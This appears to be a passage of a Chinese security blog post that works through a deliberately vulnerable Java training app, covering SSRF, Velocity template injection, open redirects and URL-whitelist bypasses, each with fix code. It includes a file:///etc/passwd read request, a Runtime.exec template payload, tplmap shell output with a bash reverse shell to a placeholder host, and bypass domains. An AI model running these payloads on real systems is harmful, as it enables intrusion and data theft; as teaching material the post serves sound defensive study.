html.append(inputLine);</span><br><span class="line">        &#125;</span><br><span class="line">        in.close();</span><br><span class="line">        return html.toString();</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        logger.error(e.getMessage());</span><br><span class="line">        return e.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接调用了URLConnection()方法 导致存在任意文件读</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027092620488.png" alt="image-20211027092620488"></p>
<p>修复代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;urlConnection&#x2F;sec&quot;)</span><br><span class="line">public String URLConnectionSec(String url) &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Decline not http&#x2F;https protocol</span><br><span class="line">    if (!SecurityUtil.isHttp(url)) &#123;</span><br><span class="line">        return &quot;[-] SSRF check failed&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        SecurityUtil.startSSRFHook();</span><br><span class="line">        return HttpUtils.URLConnection(url);</span><br><span class="line">    &#125; catch (SSRFException | IOException e) &#123;</span><br><span class="line">        return e.getMessage();</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        SecurityUtil.stopSSRFHook();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先通过isHTTP()函数来看判断是否是http和https协议，之后调用钩子去调用SocketHookFactory，具体防护在SSRFChecker.java</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package org.joychou.security.ssrf;</span><br><span class="line"></span><br><span class="line">import java.net.HttpURLConnection;</span><br><span class="line">import java.net.InetAddress;</span><br><span class="line">import java.net.URI;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.lang.StringUtils;</span><br><span class="line">import org.apache.commons.net.util.SubnetUtils;</span><br><span class="line">import org.joychou.config.WebConfig;</span><br><span class="line">import org.joychou.security.SecurityUtil;</span><br><span class="line">import org.slf4j.Logger;</span><br><span class="line">import org.slf4j.LoggerFactory;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class SSRFChecker &#123;</span><br><span class="line"></span><br><span class="line">    private static Logger logger &#x3D; LoggerFactory.getLogger(SSRFChecker.class);</span><br><span class="line"></span><br><span class="line">    public static boolean checkURLFckSSRF(String url) &#123;</span><br><span class="line">        if (null &#x3D;&#x3D; url) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;String&gt; ssrfSafeDomains &#x3D; WebConfig.getSsrfSafeDomains();</span><br><span class="line">        try &#123;</span><br><span class="line">            String host &#x3D; SecurityUtil.gethost(url);</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; 必须http&#x2F;https</span><br><span class="line">            if (!SecurityUtil.isHttp(url)) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (ssrfSafeDomains.contains(host)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            for (String ssrfSafeDomain : ssrfSafeDomains) &#123;</span><br><span class="line">                if (host.endsWith(&quot;.&quot; + ssrfSafeDomain)) &#123;</span><br><span class="line">                    return true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 解析url的ip，判断ip是否是内网ip，所以TTL设置为0的情况不适用。</span><br><span class="line">     * url只允许https或者http，并且设置默认连接超时时间。</span><br><span class="line">     * 该修复方案会主动请求重定向后的链接。</span><br><span class="line">     *</span><br><span class="line">     * @param url        check的url</span><br><span class="line">     * @param checkTimes 设置重定向检测的最大次数，建议设置为10次</span><br><span class="line">     * @return 安全返回true，危险返回false</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public static boolean checkSSRF(String url, int checkTimes) &#123;</span><br><span class="line"></span><br><span class="line">        HttpURLConnection connection;</span><br><span class="line">        int connectTime &#x3D; 5 * 1000;  &#x2F;&#x2F; 设置连接超时时间5s</span><br><span class="line">        int i &#x3D; 1;</span><br><span class="line">        String finalUrl &#x3D; url;</span><br><span class="line">        try &#123;</span><br><span class="line">            do &#123;</span><br><span class="line">                &#x2F;&#x2F; 判断当前请求的URL是否是内网ip</span><br><span class="line">                if (isInternalIpByUrl(finalUrl)) &#123;</span><br><span class="line">                    logger.error(&quot;[-] SSRF check failed. Dangerous url: &quot; + finalUrl);</span><br><span class="line">                    return false;  &#x2F;&#x2F; 内网ip直接return，非内网ip继续判断是否有重定向</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                connection &#x3D; (HttpURLConnection) new URL(finalUrl).openConnection();</span><br><span class="line">                connection.setInstanceFollowRedirects(false);</span><br><span class="line">                connection.setUseCaches(false); &#x2F;&#x2F; 设置为false，手动处理跳转，可以拿到每个跳转的URL</span><br><span class="line">                connection.setConnectTimeout(connectTime);</span><br><span class="line">                &#x2F;&#x2F;connection.setRequestMethod(&quot;GET&quot;);</span><br><span class="line">                connection.connect(); &#x2F;&#x2F; send dns request</span><br><span class="line">                int responseCode &#x3D; connection.getResponseCode(); &#x2F;&#x2F; 发起网络请求</span><br><span class="line">                if (responseCode &gt;&#x3D; 300 &amp;&amp; responseCode &lt;&#x3D; 307 &amp;&amp; responseCode !&#x3D; 304 &amp;&amp; responseCode !&#x3D; 306) &#123;</span><br><span class="line">                    String redirectedUrl &#x3D; connection.getHeaderField(&quot;Location&quot;);</span><br><span class="line">                    if (null &#x3D;&#x3D; redirectedUrl)</span><br><span class="line">                        break;</span><br><span class="line">                    finalUrl &#x3D; redirectedUrl;</span><br><span class="line">                    i +&#x3D; 1;  &#x2F;&#x2F; 重定向次数加1</span><br><span class="line">                    logger.info(&quot;redirected url: &quot; + finalUrl);</span><br><span class="line">                    if (i &#x3D;&#x3D; checkTimes) &#123;</span><br><span class="line">                        return false;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; else</span><br><span class="line">                    break;</span><br><span class="line">            &#125; while (connection.getResponseCode() !&#x3D; HttpURLConnection.HTTP_OK);</span><br><span class="line">            connection.disconnect();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return true;  &#x2F;&#x2F; 如果异常了，认为是安全的，防止是超时导致的异常而验证不成功。</span><br><span class="line">        &#125;</span><br><span class="line">        return true; &#x2F;&#x2F; 默认返回true</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 判断一个URL的IP是否是内网IP</span><br><span class="line">     *</span><br><span class="line">     * @return 如果是内网IP，返回true；非内网IP，返回false。</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public static boolean isInternalIpByUrl(String url) &#123;</span><br><span class="line"></span><br><span class="line">        String host &#x3D; url2host(url);</span><br><span class="line">        if (host.equals(&quot;&quot;)) &#123;</span><br><span class="line">            return true; &#x2F;&#x2F; 异常URL当成内网IP等非法URL处理</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String ip &#x3D; host2ip(host);</span><br><span class="line">        if (ip.equals(&quot;&quot;)) &#123;</span><br><span class="line">            return true; &#x2F;&#x2F; 如果域名转换为IP异常，则认为是非法URL</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return isInternalIp(ip);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 使用SubnetUtils库判断ip是否在内网网段</span><br><span class="line">     *</span><br><span class="line">     * @param strIP ip字符串</span><br><span class="line">     * @return 如果是内网ip，返回true，否则返回false。</span><br><span class="line">     *&#x2F;</span><br><span class="line">    static boolean isInternalIp(String strIP) &#123;</span><br><span class="line">        if (StringUtils.isEmpty(strIP)) &#123;</span><br><span class="line">            logger.error(&quot;[-] SSRF check failed. IP is empty. &quot; + strIP);</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;String&gt; blackSubnets &#x3D; WebConfig.getSsrfBlockIps();</span><br><span class="line">        for (String subnet : blackSubnets) &#123;</span><br><span class="line">            SubnetUtils utils &#x3D; new SubnetUtils(subnet);</span><br><span class="line">            if (utils.getInfo().isInRange(strIP)) &#123;</span><br><span class="line">                logger.error(&quot;[-] SSRF check failed. Internal IP: &quot; + strIP);</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return false;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * host转换为IP</span><br><span class="line">     * 会将各种进制的ip转为正常ip</span><br><span class="line">     * 167772161转换为10.0.0.1</span><br><span class="line">     * 127.0.0.1.xip.io转换为127.0.0.1</span><br><span class="line">     *</span><br><span class="line">     * @param host 域名host</span><br><span class="line">     *&#x2F;</span><br><span class="line">    private static String host2ip(String host) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            InetAddress IpAddress &#x3D; InetAddress.getByName(host); &#x2F;&#x2F;  send dns request</span><br><span class="line">            return IpAddress.getHostAddress();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 从URL中获取host，限制为http&#x2F;https协议。只支持http:&#x2F;&#x2F; 和 https:&#x2F;&#x2F;，不支持&#x2F;&#x2F;的http协议。</span><br><span class="line">     *</span><br><span class="line">     * @param url http的url</span><br><span class="line">     *&#x2F;</span><br><span class="line">    private static String url2host(String url) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F; 使用URI，而非URL，防止被绕过。</span><br><span class="line">            URI u &#x3D; new URI(url);</span><br><span class="line">            if (SecurityUtil.isHttp(url)) &#123;</span><br><span class="line">                return u.getHost();</span><br><span class="line">            &#125;</span><br><span class="line">            return &quot;&quot;;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="15-SSTI"><a href="#15-SSTI" class="headerlink" title="15.SSTI"></a>15.SSTI</h2><blockquote>
<p>ssti服务端模板注入，ssti主要为python的一些框架 jinja2、 mako tornado 、django，PHP框架smarty twig，java框架FreeMarker、jade、 velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。</p>
</blockquote>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;velocity&quot;)</span><br><span class="line">public void velocity(String template) &#123;</span><br><span class="line">    Velocity.init();</span><br><span class="line"></span><br><span class="line">    VelocityContext context &#x3D; new VelocityContext();</span><br><span class="line"></span><br><span class="line">    context.put(&quot;author&quot;, &quot;Elliot A.&quot;);</span><br><span class="line">    context.put(&quot;address&quot;, &quot;217 E Broadway&quot;);</span><br><span class="line">    context.put(&quot;phone&quot;, &quot;555-1337&quot;);</span><br><span class="line"></span><br><span class="line">    StringWriter swOut &#x3D; new StringWriter();</span><br><span class="line">    Velocity.evaluate(context, swOut, &quot;test&quot;, template);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问URL：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.137.16:8080&#x2F;java_sec_code_war&#x2F;ssti&#x2F;velocity?template&#x3D;%23set($e&#x3D;%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22open%20-a%20Calculator%22)</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027143734728.png" alt="image-20211027143734728"></p>
<p>也可以使用<a href="https://github.com/epinna/tplmap来验证">https://github.com/epinna/tplmap来验证</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;epinna&#x2F;tplmap</span><br><span class="line">python tplmap.py --os-shell -u &#39;http:&#x2F;&#x2F;localhost:8080&#x2F;ssti&#x2F;velocity?template&#x3D;aa&#39;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] Testing if GET parameter &#39;template&#39; is injectable</span><br><span class="line">[+] Smarty plugin is testing rendering with tag &#39;*&#39;</span><br><span class="line">[+] Smarty plugin is testing blind injection</span><br><span class="line">[+] Mako plugin is testing rendering with tag &#39;$&#123;*&#125;&#39;</span><br><span class="line">[+] Mako plugin is testing blind injection</span><br><span class="line">[+] Python plugin is testing rendering with tag &#39;str(*)&#39;</span><br><span class="line">[+] Python plugin is testing blind injection</span><br><span class="line">[+] Tornado plugin is testing rendering with tag &#39;&#123;&#123;*&#125;&#125;&#39;</span><br><span class="line">[+] Tornado plugin is testing blind injection</span><br><span class="line">[+] Jinja2 plugin is testing rendering with tag &#39;&#123;&#123;*&#125;&#125;&#39;</span><br><span class="line">[+] Jinja2 plugin is testing blind injection</span><br><span class="line">[+] Twig plugin is testing rendering with tag &#39;&#123;&#123;*&#125;&#125;&#39;</span><br><span class="line">[+] Twig plugin is testing blind injection</span><br><span class="line">[+] Freemarker plugin is testing rendering with tag &#39;*&#39;</span><br><span class="line">[+] Freemarker plugin is testing blind injection</span><br><span class="line">[+] Velocity plugin is testing rendering with tag &#39;*&#39;</span><br><span class="line">[+] Velocity plugin is testing blind injection</span><br><span class="line">[+] Velocity plugin has confirmed blind injection</span><br><span class="line">[+] Tplmap identified the following injection point:</span><br><span class="line"></span><br><span class="line">  GET parameter: template</span><br><span class="line">  Engine: Velocity</span><br><span class="line">  Injection: *</span><br><span class="line">  Context: text</span><br><span class="line">  OS: undetected</span><br><span class="line">  Technique: blind</span><br><span class="line">  Capabilities:</span><br><span class="line"></span><br><span class="line">   Shell command execution: ok (blind)</span><br><span class="line">   Bind and reverse shell: ok</span><br><span class="line">   File write: ok (blind)</span><br><span class="line">   File read: no</span><br><span class="line">   Code evaluation: no</span><br><span class="line"></span><br><span class="line">[+] Blind injection has been found and command execution will not produce any output.</span><br><span class="line">[+] Delay is introduced appending &#39;&amp;&amp; sleep &lt;delay&gt;&#39; to the shell commands. True or False is returned whether it returns successfully or not.</span><br><span class="line">[+] Run commands on the operating system.</span><br><span class="line"> (blind) $ id</span><br><span class="line">True</span><br><span class="line"> (blind) $ whoami</span><br><span class="line">True</span><br><span class="line"> (blind) $ bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;reverse_ip&#x2F;2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>修复意见：</p>
<p>针对于不同的模板引擎，该漏洞的修复方法会有所不同，但如果在传递给模板指令之前，对用户输入进行安全过滤的话，则可以大大减少这类威胁。此外，另一种防御方法是使用沙箱环境，将危险的指令删除/禁用，或者对系统环境进行安全加固。</p>
<ol>
<li><a href="https://xz.aliyun.com/t/7466">白头搔更短，SSTI惹人心</a></li>
</ol>
<h2 id="16-URLRedirect"><a href="#16-URLRedirect" class="headerlink" title="16.URLRedirect"></a>16.URLRedirect</h2><p>url重定向漏洞也称url任意跳转漏洞，网站信任了用户的输入导致恶意攻击，url重定向主要用来钓鱼，比如url跳转中最常见的跳转在登陆口，支付口，也就是一旦登陆将会跳转任意自己构造的网站，如果设置成自己的url则会造成钓鱼。</p>
<p>url跳转常见的地方</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 登陆跳转我认为是最常见的跳转类型，认证完后会跳转，所以在登陆的时候建议多观察url参数</span><br><span class="line">2. 用户分享、收藏内容过后，会跳转</span><br><span class="line">3. 跨站点认证、授权后，会跳转</span><br><span class="line">4. 站内点击其它网址链接时，会跳转</span><br><span class="line">5. 在一些用户交互页面也会出现跳转，如请填写对客服评价，评价成功跳转主页，填写问卷，等等业务，注意观察url。</span><br><span class="line">6. 业务完成后跳转这可以归结为一类跳转，比如修改密码，修改完成后跳转登陆页面，绑定银行卡，绑定成功后返回银行卡充值等页面，或者说给定一个链接办理VIP，但是你需要认证身份才能访问这个业务，这个时候通常会给定一个链接，认证之后跳转到刚刚要办理VIP的页面。</span><br></pre></td></tr></table></figure>

<p>url跳转常用到的参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redirect</span><br><span class="line">url</span><br><span class="line">redirectUrl</span><br><span class="line">callback</span><br><span class="line">return_url</span><br><span class="line">toUrl</span><br><span class="line">ReturnUrl</span><br><span class="line">fromUrl</span><br><span class="line">redUrl</span><br><span class="line">request</span><br><span class="line">redirect_to</span><br><span class="line">redirect_url</span><br><span class="line">jump</span><br><span class="line">jump_to</span><br><span class="line">target</span><br><span class="line">to</span><br><span class="line">goto</span><br><span class="line">link</span><br><span class="line">linkto</span><br><span class="line">domain</span><br><span class="line">oauth_callback</span><br></pre></td></tr></table></figure>

<p>核心代码：</p>
<p>重定向跳转：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;redirect&quot;)</span><br><span class="line">public String redirect(@RequestParam(&quot;url&quot;) String url) &#123;</span><br><span class="line">    return &quot;redirect:&quot; + url;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>301跳转：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;setHeader&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public static void setHeader(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">    String url &#x3D; request.getParameter(&quot;url&quot;);</span><br><span class="line">    response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY); &#x2F;&#x2F; 301 redirect</span><br><span class="line">    response.setHeader(&quot;Location&quot;, url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>302跳转：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;sendRedirect&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public static void sendRedirect(HttpServletRequest request, HttpServletResponse response) throws IOException &#123;</span><br><span class="line">    String url &#x3D; request.getParameter(&quot;url&quot;);</span><br><span class="line">    response.sendRedirect(url); &#x2F;&#x2F; 302 redirect</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修复方式：</p>
<p>只能内部跳转</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;forward&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public static void forward(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">    String url &#x3D; request.getParameter(&quot;url&quot;);</span><br><span class="line">    RequestDispatcher rd &#x3D; request.getRequestDispatcher(url);</span><br><span class="line">    try &#123;</span><br><span class="line">        rd.forward(request, response);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过checkURL去检查输入的参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    @RequestMapping(&quot;&#x2F;sendRedirect&#x2F;sec&quot;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public void sendRedirect_seccode(HttpServletRequest request, HttpServletResponse response)</span><br><span class="line">            throws IOException &#123;</span><br><span class="line">        String url &#x3D; request.getParameter(&quot;url&quot;);</span><br><span class="line">        if (SecurityUtil.checkURL(url) &#x3D;&#x3D; null) &#123;</span><br><span class="line">            response.setStatus(HttpServletResponse.SC_FORBIDDEN);</span><br><span class="line">            response.getWriter().write(&quot;url forbidden&quot;);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        response.sendRedirect(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 同时支持一级域名和多级域名，相关配置在resources目录下url&#x2F;url_safe_domain.xml文件。</span><br><span class="line"> * 优先判断黑名单，如果满足黑名单return null。</span><br><span class="line"> *</span><br><span class="line"> * @param url the url need to check</span><br><span class="line"> * @return Safe url returns original url; Illegal url returns null;</span><br><span class="line"> *&#x2F;</span><br><span class="line">public static String checkURL(String url) &#123;</span><br><span class="line"></span><br><span class="line">    if (null &#x3D;&#x3D; url)&#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ArrayList&lt;String&gt; safeDomains &#x3D; WebConfig.getSafeDomains();</span><br><span class="line">    ArrayList&lt;String&gt; blockDomains &#x3D; WebConfig.getBlockDomains();</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        String host &#x3D; gethost(url);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 必须http&#x2F;https</span><br><span class="line">        if (!isHttp(url)) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 如果满足黑名单返回null</span><br><span class="line">        if (blockDomains.contains(host))&#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        for(String blockDomain: blockDomains) &#123;</span><br><span class="line">            if(host.endsWith(&quot;.&quot; + blockDomain)) &#123;</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 支持多级域名</span><br><span class="line">        if (safeDomains.contains(host))&#123;</span><br><span class="line">            return url;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 支持一级域名</span><br><span class="line">        for(String safedomain: safeDomains) &#123;</span><br><span class="line">            if(host.endsWith(&quot;.&quot; + safedomain)) &#123;</span><br><span class="line">                return url;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125; catch (NullPointerException e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>检测相关url是否在自己配置中，若不在则返回NULL</p>
<h2 id="17-URLWhiteList"><a href="#17-URLWhiteList" class="headerlink" title="17.URLWhiteList"></a>17.URLWhiteList</h2><h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h3><blockquote>
<blockquote>
<p>安全工程师：接口需要验证参数中的URL是否是内部域名。<br>开发工程师：好的，没问题。</p>
</blockquote>
</blockquote>
<p>如果不使用已经写好的安全框架，真正让开发去添加一个URL白名单，我相信不少人会出现不同程度的安全问题。</p>
<p>所以，我觉得有必要单独拿出来简单说下这个问题。</p>
<h3 id="2-可造成的漏洞"><a href="#2-可造成的漏洞" class="headerlink" title="2.可造成的漏洞"></a>2.可造成的漏洞</h3><p>和URL有关系的漏洞，我们可以联想到包括但不局限于下面的漏洞</p>
<ul>
<li>CSRF</li>
<li>JSONP</li>
<li>SSRF</li>
<li>URL跳转</li>
<li>绕过CORS(跨域资源分享)</li>
</ul>
<h3 id="3-Bypass-Poc及实际案例"><a href="#3-Bypass-Poc及实际案例" class="headerlink" title="3.Bypass Poc及实际案例"></a>3.Bypass Poc及实际案例</h3><p>先来看一下应该如何安全验证：</p>
<p>先来看下应该如何安全验证：</p>
<ul>
<li>取一级域名</li>
<li>判断一级域名是否在白名单里</li>
</ul>
<p>但是，在实际的甲方安全中，很多开发者会犯以下的一些错误。</p>
<h4 id="1-endsWith"><a href="#1-endsWith" class="headerlink" title="1.endsWith"></a>1.endsWith</h4><p>Bypass Poc:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bypassjoychou.com</span><br></pre></td></tr></table></figure>

<p>案例：<br>飞猪做referer校验的时候，全站存在referer校验bypass问题，导致全站存在Json Hijack等漏洞，可以拿到飞猪的开房记录等信息。目前漏洞已经修复。</p>
<p>绕过的poc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Referer: https:&#x2F;&#x2F;www.joychoualitrip.com&#x2F;mytrip&#x2F;</span><br></pre></td></tr></table></figure>

<p>针对JSONP，这里提一个比较有趣的问题。有的接口返回是JSON，非JSONP的格式，但是由于开发者写了一个callback参数（但是流量里并未出现）。所以在自动动扫描漏洞时，扫描器可加上<code>callback、cback</code>等参数，可能会有意想不到的收获。</p>
<p>比如：<code>http://www.alitrip.com/order?id=1</code>返回JSON格式，所以并不存在JSON劫持。但是访问<code>http://www.alitrip.com/order?id=1&amp;callback=xxx</code>可能就会返回JSONP格式，从而可能存在JSON劫持漏洞。</p>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;vuln&#x2F;endsWith&quot;)</span><br><span class="line"> public String endsWith(@RequestParam(&quot;url&quot;) String url) &#123;</span><br><span class="line"></span><br><span class="line">     String host &#x3D; SecurityUtil.gethost(url);</span><br><span class="line"></span><br><span class="line">     for (String domain : domainwhitelist) &#123;</span><br><span class="line">         if (host.endsWith(domain)) &#123;</span><br><span class="line">             return &quot;Good url.&quot;;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     return &quot;Bad url.&quot;;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;url&#x2F;vuln&#x2F;endsWith?url&#x3D;http:&#x2F;&#x2F;aaajoychou.org</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027151121258.png" alt="image-20211027151121258"></p>
<h4 id="2-contains"><a href="#2-contains" class="headerlink" title="2.contains"></a>2.contains</h4><p>取出一级域名。判断一级域名在白名单列表里使用contains判断</p>
<p>Bypass POC：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">joychou.com.bypass.com</span><br><span class="line">bypassjoychou.com</span><br></pre></td></tr></table></figure>

<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;vuln&#x2F;contains&quot;)</span><br><span class="line">public String contains(@RequestParam(&quot;url&quot;) String url) &#123;</span><br><span class="line"></span><br><span class="line">    String host &#x3D; SecurityUtil.gethost(url);</span><br><span class="line"></span><br><span class="line">    for (String domain : domainwhitelist) &#123;</span><br><span class="line">        if (host.contains(domain)) &#123;</span><br><span class="line">            return &quot;Good url.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return &quot;Bad url.&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;url&#x2F;vuln&#x2F;contains?url&#x3D;http:&#x2F;&#x2F;joychou.org.bypass.com</span><br></pre></td></tr></table></figure>



<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027151454711.png" alt="image-20211027151454711"></p>
<h4 id="3-statsWith"><a href="#3-statsWith" class="headerlink" title="3.statsWith"></a>3.statsWith</h4><p>取出一级域名，判断一级域名在白名单列表里使用<code>startsWith</code>判断</p>
<p>Bypass Poc:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">joychou.combypass</span><br></pre></td></tr></table></figure>

<p>这种域名后缀虽然不存在，造成无法利用。但是在实际的测试中，确实发现某大公司是以这样的方式写的代码。所以说，如果没有规范，什么样的逻辑代码都能写出来。</p>
<h4 id="4-正则表达式"><a href="#4-正则表达式" class="headerlink" title="4.正则表达式"></a>4.正则表达式</h4><p>用正则表达式去匹配URL中是否存在<code>www.joychou.com</code>字符串<br>Bypass Poc:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.joychou.com.bypass.com</span><br></pre></td></tr></table></figure>

<p>还有的URL接口验证是否是图片链接，但是验证的方式居然是用正则匹配是否以类似<code>.800*600.</code>结尾。</p>
<p>Bypass Poc:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.joychou.com&#x2F;_4528x2020.php</span><br></pre></td></tr></table></figure>

<p>用正则判断host是否是域名</p>
<p>Bypass Poc:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.10.xip.io</span><br></pre></td></tr></table></figure>

<p>案例：<br>腾讯某域名诊断功能存在SSRF（目前该漏洞已经修复）。<br>该功能验证逻辑，首先判断host是否是域名。</p>
<p>所以我们可以利用<code>xip.io</code>进行Bypass。</p>
